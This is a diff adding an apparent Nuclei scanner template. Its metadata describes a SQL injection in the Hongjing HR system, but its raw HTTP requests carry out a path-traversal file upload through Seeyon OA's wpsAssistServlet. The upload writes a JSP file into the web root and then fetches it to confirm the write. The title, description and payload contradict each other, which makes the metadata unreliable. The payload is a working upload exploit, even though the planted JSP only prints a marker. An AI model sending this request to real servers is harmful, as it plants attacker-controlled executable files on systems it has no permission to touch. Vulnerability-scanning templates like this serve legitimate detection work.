@@ -1,0 +1,51 @@
+id: CNVD-2023-08743
+
+info:
+  name: Hongjing Human Resource Management System - SQL Injection
+  author: SleepingBag945
+  severity: critical
+  description: There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.
+  reference:
+    - https://www.henry4e36.top/index.php/archives/162.html
+    - https://blog.csdn.net/qq_41904294/article/details/130944159
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="致远互联-OA" && title="V8.0SP2"
+  tags: cnvd,cnvd2023,hongjing,hcm
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/mikes.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 217
+        Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
+
+        --a4d7586ac9d50625dee11e86fa69bc71
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("20231101");%>  
+        --a4d7586ac9d50625dee11e86fa69bc71--
+
+  - raw:
+      - |
+        GET /mikes.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      # - type: dsl
+      #   dsl:
+      #     - 'status_code == 200'
+      #     - 'contains_all(body,"data")'
+      #   condition: and
+      - type: word
+        words:
+          - "20231101"
